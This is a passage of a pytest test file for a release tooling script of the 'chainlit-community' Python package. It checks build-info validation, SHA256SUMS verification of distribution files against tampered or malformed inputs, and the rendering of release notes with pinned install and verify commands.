        "version=3.0.0rc1",
        "client_version=0.6.0-dev.1300",
        "base_version=3.0.0",
        "build_number=1300",
        f"sha={SHA}",
        "run_id=555555555",
        "pr_number=",
        "wheel=chainlit_community-3.0.0rc1-py3-none-any.whl",
        "sdist=chainlit_community-3.0.0rc1.tar.gz",
        "react_client=chainlit-react-client-0.6.0-dev.1300.tgz",
    ]

    code, out, _ = _run(capsys, "validate", str(_write(tmp_path, FINAL_INFO)))
    fields = dict(line.split("=", 1) for line in out.splitlines())
    assert (code, fields["kind"], fields["prerelease"]) == (0, "official", "false")

    for info in (MAIN_INFO, PR_INFO):
        code, out, _ = _run(capsys, "validate", str(_write(tmp_path, info)))
        assert (code, "prerelease=true" in out.splitlines()) == (0, True)


@pytest.mark.parametrize(
    ("info", "expected"),
    [
        (RC_INFO, "3.0.0"),
        (RC_INFO, "3.0.0rc2"),
        (RC_INFO, "3.0.0rc1 "),
        (RC_INFO, ""),
        (FINAL_INFO, "3.0.0rc1"),
        (FINAL_INFO, "3.0"),
        (MAIN_INFO, "3.0.0"),
        (FINAL_INFO, EVIL),
    ],
)
def test_expect_version_must_match(info: dict, expected: str, tmp_path, capsys):
    code, out, err = _run(
        capsys, "validate", str(_write(tmp_path, info)), "--expect-version", expected
    )

    assert (code, out) == (1, "")
    assert "does not match --expect-version" in err
    assert EVIL not in err


# --- validate --verify-dist --------------------------------------------------


def _digest(name: str) -> str:
    return hashlib.sha256(name.encode()).hexdigest()


def _make_dist(tmp_path: Path, info: dict = RC_INFO, mode: str = "*") -> Path:
    """What the build uploads: the three files, build-info.json, SHA256SUMS."""
    dist = tmp_path / "dist"
    dist.mkdir()
    (dist / "build-info.json").write_text(json.dumps(info))
    for name in info["files"].values():
        (dist / name).write_bytes(name.encode())
    (dist / "SHA256SUMS").write_bytes(_sums(info, mode).encode())
    return dist


def _sums(info: dict = RC_INFO, mode: str = "*") -> str:
    return "".join(f"{_digest(name)} {mode}{name}\n" for name in info["files"].values())


def _verify(capsys, dist: Path, *argv: str) -> tuple[int, str, str]:
    return _run(
        capsys,
        "validate",
        str(dist / "build-info.json"),
        "--verify-dist",
        str(dist),
        *argv,
    )


@pytest.mark.parametrize("mode", ["*", " "], ids=["binary", "text"])
@pytest.mark.parametrize(
    ("info", "kind"),
    [(RC_INFO, "official"), (FINAL_INFO, "official"), (MAIN_INFO, "release")],
)
def test_verify_dist_accepts_a_good_dist(
    info: dict, kind: str, mode: str, tmp_path, capsys
):
    dist = _make_dist(tmp_path, info, mode)

    code, out, err = _verify(capsys, dist, "--kind", kind)

    assert (code, err) == (0, "")
    assert f"kind={kind}" in out.splitlines()
    assert f"wheel={info['files']['wheel']}" in out.splitlines()


def test_verify_dist_accepts_what_finalize_writes(stamped_repo, tmp_path, capsys):
    ci_version, root = stamped_repo
    info = ci_version.compute(
        root,
        event="push",
        ref="refs/heads/main",
        sha=SHA,
        run_id="123456789",
        number=1234,
    )
    dist = tmp_path / "dist"
    ci_version.write_json(dist / "build-info.json", info)
    for name in info["files"].values():
        (dist / name).write_bytes(b"content of " + name.encode())
    ci_version.finalize(dist, dist / "build-info.json")

    assert _verify(capsys, dist, "--kind", "release")[0] == 0


@pytest.mark.parametrize("kind", ["wheel", "sdist", "react_client"])
def test_verify_dist_rejects_a_tampered_file(kind: str, tmp_path, capsys):
    dist = _make_dist(tmp_path)
    (dist / RC_INFO["files"][kind]).write_bytes(b"tampered")

    code, out, err = _verify(capsys, dist)

    assert (code, out) == (1, "")
    assert f"checksum mismatch for {RC_INFO['files'][kind]}" in err


@pytest.mark.parametrize("kind", ["wheel", "sdist", "react_client"])
def test_verify_dist_rejects_a_missing_file(kind: str, tmp_path, capsys):
    dist = _make_dist(tmp_path)
    (dist / RC_INFO["files"][kind]).unlink()

    code, out, err = _verify(capsys, dist)

    assert (code, out) == (1, "")
    assert "is missing" in err


def test_verify_dist_rejects_a_symlinked_file(tmp_path, capsys):
    dist = _make_dist(tmp_path)
    wheel = dist / RC_INFO["files"]["wheel"]
    target = tmp_path / "elsewhere.whl"
    wheel.rename(target)
    wheel.symlink_to(target)

    assert _verify(capsys, dist)[0] == 1


_WHEEL, _SDIST, _CLIENT = _sums().splitlines(keepends=True)
BAD_CHECKSUMS = {
    "empty": "",
    "extra line": _sums() + f"{_digest('x')} *extra.whl\n",
    "extra line for build-info": _sums() + f"{_digest('x')} *build-info.json\n",
    "duplicate line": _sums() + _WHEEL,
    "missing line": _WHEEL + _SDIST,
    "duplicate instead of a file": _WHEEL + _SDIST + _SDIST,
    "wrong name": _WHEEL
    + _SDIST
    + f"{_digest('x')} *chainlit-react-client-9.9.9.tgz\n",
    "upstream wheel name": _sums().replace("chainlit_community-", "chainlit-"),
    "no trailing newline": _sums().rstrip("\n"),
    "blank line": _sums() + "\n",
    "leading blank line": "\n" + _sums(),
    "crlf": _sums().replace("\n", "\r\n"),
    "carriage return as line end": _sums().replace("\n", "\r", 1),
    "uppercase digest": _sums().upper(),
    "short digest": _sums().replace(_digest(RC_INFO["files"]["wheel"]), "abc123"),
    "one space only": _sums().replace(" *", " "),
    "three spaces": _sums().replace(" *", "   "),
    "tab separator": _sums().replace(" *", "\t"),
    "path in name": _sums().replace(" *chainlit_", " *./chainlit_"),
    "parent path": _sums().replace(" *chainlit_", " *../chainlit_"),
    "bsd format": "".join(
        f"SHA256 ({name}) = {_digest(name)}\n" for name in RC_INFO["files"].values()
    ),
    "escaped name": "\\" + _sums(),
    "comment": "# checksums\n" + _sums(),
    "evil name": _sums() + f"{_digest('x')} *{EVIL}\n",
    "not text": "\xff\xfe" + _sums(),
    "too large": _sums() * 40,
}


@pytest.mark.parametrize("content", BAD_CHECKSUMS.values(), ids=BAD_CHECKSUMS.keys())
def test_verify_dist_rejects_bad_checksum_files(content: str, tmp_path, capsys):
    dist = _make_dist(tmp_path)
    (dist / "SHA256SUMS").write_bytes(content.encode("latin-1"))

    code, out, err = _verify(capsys, dist)

    assert (code, out) == (1, "")
    assert err.startswith("error: SHA256SUMS: ")
    assert EVIL not in err


def test_verify_dist_needs_the_checksum_file(tmp_path, capsys):
    dist = _make_dist(tmp_path)
    (dist / "SHA256SUMS").unlink()

    code, out, err = _verify(capsys, dist)

    assert (code, out) == (1, "")
    assert "cannot be read" in err


def test_verify_dist_uses_the_names_of_the_validated_build_info(tmp_path, capsys):
    """Checksums of another build do not pass for this one."""
    dist = _make_dist(tmp_path, FINAL_INFO)
    (dist / "build-info.json").write_text(json.dumps(RC_INFO))

    code, out, err = _verify(capsys, dist)

    assert (code, out) == (1, "")
    assert "must list exactly" in err


def test_preview_release_workflow_uses_verify_dist():
    workflow = (
        _SCRIPT.parents[1] / ".github" / "workflows" / "preview-release.yaml"
    ).read_text(encoding="utf-8")

    assert '--verify-dist "$RUNNER_TEMP/dist"' in workflow


# --- official renderer -------------------------------------------------------

INSTALL_LABELS = [
    "# pip",
    "# uv, in a project: records the dependency in pyproject.toml",
    "# uv, without a project: installs into the active virtual environment only",
    "# poetry",
]


def _section(body: str, heading: str) -> str:
    """Text from a heading line up to the next heading of the same level."""
    level = heading.split(" ", 1)[0]
    lines = body.splitlines()
    start = lines.index(heading)
    end = next(
        (
            index
            for index in range(start + 1, len(lines))
            if lines[index].startswith(f"{level} ")
        ),
        len(lines),
    )
    return "\n".join(lines[start:end])


class TestOfficial:
    def test_final_has_the_hand_written_notes_then_the_changelog(self, notes: dict):
        body = _render_official(FINAL_INFO, notes)

        assert body.startswith(NOTES.strip() + "\n\n## Changelog\n\n")
        assert NOTES.strip() in body  # verbatim, comment and trailing spaces included
        changelog = "### Removed\n\n- **Breaking:** the thing."
        assert f"## Changelog\n\n{changelog}\n\n## Install\n" in body
        assert "unreleased change" not in body
        assert "- Old." not in body
        assert "pre-release" not in body
        assert "rehearsal" not in body

    def test_pre_release_has_a_notice_then_the_unreleased_changes(self, notes: dict):
        body = _render_official(RC_INFO, notes)

        assert body.startswith("> [!NOTE]\n> This is a **pre-release** of ")
        assert "`chainlit-community` 3.0.0, published for testing" in body
        assert (
            "### Added\n\n- An unreleased change with `code` and <b>html</b>.\n\n"
            "## Install\n"
        ) in body
        assert (
            body.index("> [!NOTE]")
            < body.index("## Changelog")
            < body.index("### Added")
        )
        assert "Upgrading to 3.0.0" not in body
        assert "the thing" not in body

    @pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
    def test_sections_come_in_order(self, info: dict, notes: dict):
        body = _render_official(info, notes)
        headings = [line for line in body.splitlines() if line.startswith("## ")]

        assert headings == ["## Changelog", "## Install", "## Verify"]
        assert body.endswith("```\n")

    @pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
    def test_install_commands_pin_the_version(self, info: dict, notes: dict):
        version = info["version"]
        install = _section(_render_official(info, notes), "## Install")
        lines = install.splitlines()

        assert f"### Python package (`chainlit-community` {version})" in lines
        for label, command in zip(
            INSTALL_LABELS,
            [
                f'pip install "chainlit-community=={version}"',
                f'uv add "chainlit-community=={version}"',
                f'uv pip install "chainlit-community=={version}"',
                f'poetry add "chainlit-community=={version}"',
            ],
            strict=True,
        ):
            assert lines[lines.index(label) + 1] == command
        assert "use the **one** command that matches your tooling" in install
        assert "installed as `chainlit-community` and imported as `chainlit`" in install
        assert "bundles the built frontend and copilot" in install
        assert "test.pypi.org" not in install
        assert (
            "releases/download" not in install.split("### `@chainlit/react-client`")[0]
        )

    def test_pre_release_explains_the_pin(self, notes: dict):
        pre = _section(_render_official(RC_INFO, notes), "## Install")
        final = _section(_render_official(FINAL_INFO, notes), "## Install")

        assert "or with `--pre` (`pip install --pre chainlit-community`)" in pre
        assert "--pre" not in final

    @pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
    @pytest.mark.parametrize("index", ["pypi", "testpypi"])
    def test_upstream_must_be_uninstalled_first(
        self, info: dict, index: str, notes: dict
    ):
        install = _section(_render_official(info, notes, index), "## Install")

        assert "> If the upstream `chainlit` distribution is installed" in install
        assert "uninstall it first (`pip uninstall chainlit`)" in install
        assert "both distributions provide the `chainlit` import package" in install

    @pytest.mark.parametrize("index", ["pypi", "testpypi"])
    def test_react_client_installs_from_the_release(self, index: str, notes: dict):
        body = _render_official(RC_INFO, notes, index)
        url = (
            f"https://github.com/{REPO}/releases/download/3.0.0rc1/"
            "chainlit-react-client-0.6.0-dev.1300.tgz"
        )

        lines = body.splitlines()
        assert "### `@chainlit/react-client` (0.6.0-dev.1300)" in lines
        assert f"npm install --allow-remote=root {url}" in lines
        assert f"pnpm add {url}" in lines
        assert "does not publish `@chainlit/react-client` to npm" in body
        assert "`--allow-remote=root`" in body

    @pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
    def test_verify_block_uses_the_release_tag(self, info: dict, notes: dict):
        verify = _section(_render_official(info, notes), "## Verify")

        assert verify.splitlines()[-5:] == [
            "```bash",
            f"gh release download {info['version']} -R {REPO}",
            "sha256sum --ignore-missing -c SHA256SUMS",
            f"gh attestation verify {info['files']['wheel']} -R {REPO}",
            "```",
        ]
        assert f"https://github.com/{REPO}/attestations" in verify

    def test_verify_block_is_the_one_of_previews(self, notes: dict):
        official = _section(_render_official(FINAL_INFO, notes), "## Verify")
        preview = _section(
            rn.render_release(rn.parse_build_info(MAIN_INFO), REPO), "## Verify"
        )

        assert official.replace("3.0.0", "X") == preview.replace("3.0.0.dev1234", "X")

    @pytest.mark.parametrize("info", [RC_INFO, FINAL_INFO], ids=["rc", "final"])
    def test_testpypi_rehearsal(self, info: dict, notes: dict):
        version = info["version"]
        body = _render_official(info, notes, "testpypi")
        flags = (
            "--index-url https://test.pypi.org/simple/ "
            "--extra-index-url https://pypi.org/simple/"
        )

        assert body.startswith("> [!WARNING]\n> This is a **rehearsal** ")
        assert f"https://test.pypi.org/project/chainlit-community/{version}/" in body
        lines = _section(body, "## Install").splitlines()
        assert lines[lines.index("# pip") + 1] == (
            f'pip install {flags} "chainlit-community=={version}"'
        )
        assert lines[
            lines.index("# uv: installs into the active virtual environment only") + 1
        ] == (
            f"uv pip install {flags} --index-strategy unsafe-best-match "
            f'"chainlit-community=={version}"'
        )
        # Nothing that would record TestPyPI in a project.
        assert not [line for line in lines if line.startswith(("uv add", "poetry"))]
        # The rest is the body of the real release.
        real = _render_official(info, notes, "pypi")
        assert body.split("## Install")[0].endswith(real.split("## Install")[0])
        assert body.split("### `@chainlit")[1] == real.split("### `@chainlit")[1]

    def test_final_needs_the_notes_file(self, notes: dict, tmp_path, capsys):
        (notes["notes_dir"] / "3.0.0.md").unlink()
        (notes["notes_dir"] / "3.0.0rc1.md").write_text("wrong one\n")

        with pytest.raises(
            rn.ValidationError, match=r"notes file 3\.0\.0\.md is missing"
        ):
            _render_official(FINAL_INFO, notes)
        # A pre-release has no notes file.
        assert "wrong one" not in _render_official(RC_INFO, notes)

        (notes["notes_dir"] / "3.0.0.md").write_text("\n \n")
        with pytest.raises(
            rn.ValidationError, match=r"notes file 3\.0\.0\.md is empty"
        ):
            _render_official(FINAL_INFO, notes)

    def test_final_needs_its_changelog_section(self, notes: dict):
        notes["changelog"].write_text(
            CHANGELOG.replace("## [3.0.0] - ", "## [3.0.1] - ")
        )

        with pytest.raises(rn.ValidationError, match=r"no '## \[3\.0\.0\]' section"):
            _render_official(FINAL_INFO, notes)

        notes["changelog"].write_text(
            "## [3.0.0] - 2026-12-01\n\n## [2.12.0]\n- Old.\n"
        )
        with pytest.raises(
            rn.ValidationError, match=r"'## \[3\.0\.0\]' section, or it"
        ):
            _render_official(FINAL_INFO, notes)

    @pytest.mark.parametrize(
        "changelog",
        [
            CHANGELOG.replace("## [Unreleased]", "## Next").replace(
                "[3.0.0]", "[3.0.1]"
            ),
            "## [Unreleased]\n\n## [3.0.0] - 2026-12-01\n\n## [2.12.0]\n- Old.\n",
            "## [Unreleased]\n\n## [2.12.0]\n- Old.\n",
        ],
        ids=["neither", "both-empty", "empty-unreleased-only"],
    )
    def test_pre_release_needs_changes(self, changelog: str, notes: dict):
        notes["changelog"].write_text(changelog)

        with pytest.raises(
            rn.ValidationError,
            match=r"no '## \[Unreleased\]' or '## \[3\.0\.0\]' section, or it is empty",
        ):
            _render_official(RC_INFO, notes)

    @pytest.mark.parametrize(
        "unreleased", ["## [Unreleased]\n\n", ""], ids=["empty", "missing"]
    )
    @pytest.mark.parametrize("index", ["pypi", "testpypi"])
    def test_pre_release_after_the_release_pr_uses_the_release_section(
        self, unreleased: str, index: str, notes: dict
    ):
        """The release PR moved the entries of [Unreleased] into [3.0.0]."""
        notes["changelog"].write_text(
            f"# Changelog\n\n{unreleased}## [3.0.0] - 2026-12-01\n\n### Removed\n\n"
            "- **Breaking:** the thing.\n\n## [2.12.0] - 2026-08-25\n\n- Old.\n"
        )

        body = _render_official(RC_INFO, notes, index)

        assert (
            "## Changelog\n\nChanges in 3.0.0 since the last release:\n\n"
            "### Removed\n\n- **Breaking:** the thing.\n\n## Install\n"
        ) in body
        assert "> This is a **pre-release** of `chainlit-community` 3.0.0" in body
        assert "- Old." not in body
        # Still a pre-release: the upgrade guide is not part of it.
        assert "Upgrading to 3.0.0" not in body
        headings = [line for line in body.splitlines() if line.startswith("## ")]
        assert headings == ["## Changelog", "## Install", "## Verify"]

    def test_pre_release_prefers_unreleased_changes(self, notes: dict):
        body = _render_official(RC_INFO, notes)

        assert "## Changelog\n\nChanges since the last release:\n\n### Added" in body
        assert "Changes in 3.0.0" not in body

    def test_final_refuses_a_draft_guide(self, notes: dict, tmp_path, capsys):
        marker = rn.DRAFT_MARKER
        assert marker == "<!-- release-notes: draft -->"
        guide = notes["notes_dir"] / "3.0.0.md"
        guide.write_text(NOTES.replace("\n", f"\n\n{marker}\n", 1), encoding="utf-8")

        for index in ("pypi", "testpypi"):
            with pytest.raises(rn.ValidationError) as error:
                _render_official(FINAL_INFO, notes, index)
            message = str(error.value)
            assert "release notes file 3.0.0.md is still marked as a draft" in message
            assert f"remove the '{marker}' line" in message
            assert "verify the upgrade guide" in message
        # Pre-releases do not use the guide.
        assert marker not in _render_official(RC_INFO, notes)

        path = str(_write(tmp_path, FINAL_INFO))
        code, out, err = _run(
            capsys,
            "official",
            path,
            "--repo",
            REPO,
            "--index",
            "pypi",
            "--changelog",
            str(notes["changelog"]),
            "--notes-dir",
            str(notes["notes_dir"]),
        )
        assert (code, out) == (1, "")
        assert "3.0.0.md is still marked as a draft" in err

        # Only a line of its own counts: prose may mention the marker.
        guide.write_text(NOTES + f"\nThe `{marker}` line is gone.\n", encoding="utf-8")
        assert f"The `{marker}` line is gone." in _render_official(FINAL_INFO, notes)

    def test_changelog_file_is_required(self, notes: dict):
        notes["changelog"].unlink()

        with pytest.raises(rn.ValidationError, match=r"changelog .* is missing"):
            _render_official(RC_INFO, notes)

    def test_too_long_a_body_is_rejected(self, notes: dict):
        (notes["notes_dir"] / "3.0.0.md").write_text("x" * 125_000)

        with pytest.raises(rn.ValidationError, match="too long"):
            _render_official(FINAL_INFO, notes)

    @pytest.mark.parametrize("index", ["", "PyPI", "npm", EVIL])
    def test_unknown_index_is_rejected(self, index: str, notes: dict):
        with pytest.raises(rn.ValidationError, match="--index must be"):
            _render_official(RC_INFO, notes, index)

    @pytest.mark.parametrize("repo", ["chainlit", "a/b/c", EVIL])
    def test_bad_repo_is_rejected(self, repo: str, notes: dict):
        with pytest.raises(rn.ValidationError, match="--repo"):
            rn.render_official(rn.parse_build_info(RC_INFO), repo, "pypi", **notes)

    def test_command(self, notes: dict, tmp_path, capsys, monkeypatch):
        path = str(_write(tmp_path, FINAL_INFO))
        argv = ["official", path, "--repo", REPO, "--index", "pypi"]
        explicit = [
            "--changelog",
            str(notes["changelog"]),
            "--notes-dir",
            str(notes["notes_dir"]),
        ]

        code, out, err = _run(capsys, *argv, *explicit, "--expect-version", "3.0.0")
        assert (code, err) == (0, "")
        assert out == _render_official(FINAL_INFO, notes)

        # The defaults are CHANGELOG.md and docs/releases of the working directory.
        monkeypatch.chdir(notes["changelog"].parent)
        assert _run(capsys, *argv) == (0, out, "")

        code, out, err = _run(capsys, *argv, "--expect-version", "3.0.0rc1")
        assert (code, out) == (1, "")
        assert "--expect-version" in err

        (notes["notes_dir"] / "3.0.0.md").unlink()
        code, out, err = _run(capsys, *argv)
        assert (code, out) == (1, "")
        assert (
            err == "error: the release notes file 3.0.0.md is missing or unreadable\n"
        )


def test_preview_notes_name_the_distribution():
    body = rn.render_release(rn.parse_build_info(MAIN_INFO), REPO)

    assert "### Python package (`chainlit-community` 3.0.0.dev1234)" in body
    assert "installed as `chainlit-community` and imported as `chainlit`" in body
    assert "If the upstream `chainlit` distribution is installed" in body
    assert "`chainlit-community`, imported as `chainlit`" in rn.render_pr_comment(
        rn.parse_build_info(PR_INFO), REPO, "success"
    )


# --- shared with scripts/ci_version.py ---------------------------------------


def test_changelog_parsers_agree_on_the_real_changelog(stamped_repo):
    ci_version, _ = stamped_repo
    text = (_SCRIPT.parents[1] / "CHANGELOG.md").read_text(encoding="utf-8")
    names = re.findall(r"^## \[([^\]\n]+)\]", text, flags=re.MULTILINE)
    assert "Unreleased" in names
    assert "2.12.0" in names
    assert len(names) > 20

    for name in [*names, "3.0.0", "0.0.0", "Unreleased ", ""]:
        section = rn.changelog_section(text, name)
        assert section == ci_version.changelog_section(text, name)
        if name in names:
            assert section is not None
            assert not section.startswith("## ")
    # Sections do not run into each other.
    assert "## [2.12.0]" not in (rn.changelog_section(text, "Unreleased") or "")
    assert rn.changelog_section(text, "Unreleased")
    assert "CVE-2026-45018" in (rn.changelog_section(text, "2.12.0") or "")
    assert "## [2.11.1]" not in (rn.changelog_section(text, "2.12.0") or "")


def test_changelog_parsers_are_the_same_code(stamped_repo):
    ci_version, _ = stamped_repo

    def body(module) -> str:
        source = Path(module.__file__).read_text(encoding="utf-8")
        start = source.index("    heading = re.compile(")
        return source[start : source.index("\n\n\n", start)]

    assert body(rn) == body(ci_version)


@pytest.mark.parametrize("name", ["release_changelog", "has_draft_marker"])
def test_shared_release_helpers_are_the_same_code(stamped_repo, name: str):
    ci_version, _ = stamped_repo

    def function(module) -> str:
        source = Path(module.__file__).read_text(encoding="utf-8")
        start = source.index(f"def {name}(")
        return source[start : source.index("\n\n\n", start)]

    assert function(rn) == function(ci_version)
    assert function(rn).count("\n") > 5
    assert rn.DRAFT_MARKER == ci_version.DRAFT_MARKER


def test_pre_release_after_the_release_pr_stamps_and_renders(
    stamped_repo, tmp_path, capsys
):
    """End to end: [Unreleased] is empty, so the rc publishes the [3.0.0] section."""
    ci_version, root = stamped_repo
    changelog = root / "CHANGELOG.md"
    changelog.write_text(
        CHANGELOG.replace(
            "### Added\n\n- An unreleased change with `code` and <b>html</b>.\n\n", ""
        ),
        encoding="utf-8",
    )
    assert (
        ci_version.changelog_section(changelog.read_text("utf-8"), "Unreleased") == ""
    )
    subprocess.run(["git", "tag", "3.0.0rc2"], cwd=root, check=False)
    info = ci_version.compute(
        root,
        event="workflow_dispatch",
        ref="refs/heads/main",
        sha=SHA,
        run_id="123456789",
        number=1300,
        release_version="3.0.0rc3",
        index="pypi",
    )

    code, out, err = _run(
        capsys,
        "official",
        str(_write(tmp_path, info)),
        "--repo",
        REPO,
        "--index",
        "pypi",
        "--changelog",
        str(changelog),
        "--notes-dir",
        str(root / "docs" / "releases"),
    )
    assert (code, err) == (0, "")
    assert (
        "## Changelog\n\nChanges in 3.0.0 since the last release:\n\n"
        "### Removed\n\n- **Breaking:** the thing.\n\n## Install\n"
    ) in out
    assert '"chainlit-community==3.0.0rc3"' in out


def test_draft_guide_is_refused_at_stamp_and_at_render(stamped_repo, tmp_path, capsys):
    """End to end: the marker stops a final in both scripts, and only a final."""
    ci_version, root = stamped_repo
    (root / "CHANGELOG.md").write_text(CHANGELOG, encoding="utf-8")
    guide = root / ci_version.RELEASE_NOTES_DIR / "3.0.0.md"
    guide.parent.mkdir(parents=True)
    guide.write_text(f"# Upgrading\n\n{rn.DRAFT_MARKER}\n\nText.\n", encoding="utf-8")

    def stamp(version: str) -> dict:
        return ci_version.compute(
            root,
            event="workflow_dispatch",
            ref="refs/heads/main",
            sha=SHA,
            run_id="123456789",
            number=1300,
            release_version=version,
            index="pypi",
        )

    def render(info: dict) -> tuple[int, str, str]:
        return _run(
            capsys,
            "official",
            str(_write(tmp_path, info)),
            "--repo",
            REPO,
            "--index",
            "pypi",
            "--changelog",
            str(root / "CHANGELOG.md"),
            "--notes-dir",
            str(guide.parent),
        )

    with pytest.raises(ci_version.VersionError, match="still marked as a draft"):
        stamp("3.0.0")
    # The renderer checks on its own: it does not rely on the stamp-time check.
    code, out, err = render(FINAL_INFO)
    assert (code, out) == (1, "")
    assert "still marked as a draft" in err
    assert render(stamp("3.0.0rc1"))[0] == 0

    guide.write_text("# Upgrading\n\nText.\n", encoding="utf-8")
    assert render(stamp("3.0.0"))[0] == 0


@pytest.mark.parametrize(
    ("version", "index", "ref"),
    [
        ("3.0.0a0", "testpypi", "refs/heads/rehearsal"),
        ("3.0.0rc1", "pypi", "refs/heads/main"),
        ("3.0.0", "pypi", "refs/heads/main"),
    ],
)
def test_official_build_info_of_ci_version_validates(
    stamped_repo, tmp_path, capsys, version: str, index: str, ref: str
):
    """End to end: what a release build stamps, validates and renders."""
    ci_version, root = stamped_repo
    (root / "CHANGELOG.md").write_text(CHANGELOG, encoding="utf-8")
    (root / ci_version.RELEASE_NOTES_DIR).mkdir(parents=True)
    (root / ci_version.RELEASE_NOTES_DIR / "3.0.0.md").write_text(NOTES)
    info = ci_version.compute(
        root,
        event="workflow_dispatch",
        ref=ref,
        sha=SHA,
        run_id="123456789",
        number=1300,
        release_version=version,
        index=index,
    )
    path = str(_write(tmp_path, info))

    code, out, err = _run(
        capsys, "validate", path, "--kind", "official", "--expect-version", version
    )
    assert (code, err) == (0, "")
    assert f"prerelease={'false' if version == '3.0.0' else 'true'}" in out.splitlines()
    assert _run(capsys, "validate", path, "--kind", "release")[0] == 1

    code, out, err = _run(
        capsys,
        "official",
        path,
        "--repo",
        REPO,
        "--index",
        index,
        "--changelog",
        str(root / "CHANGELOG.md"),
        "--notes-dir",
        str(root / ci_version.RELEASE_NOTES_DIR),
    )
    assert (code, err) == (0, "")
    assert f'"chainlit-community=={version}"' in out


def test_script_runs_isolated():
    """Standalone and standard library only: `python3 -I` must be enough."""
    result = subprocess.run(
        [sys.executable, "-I", str(_SCRIPT), "validate", "--help"],
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0
    assert "--verify-dist" in result.stdout
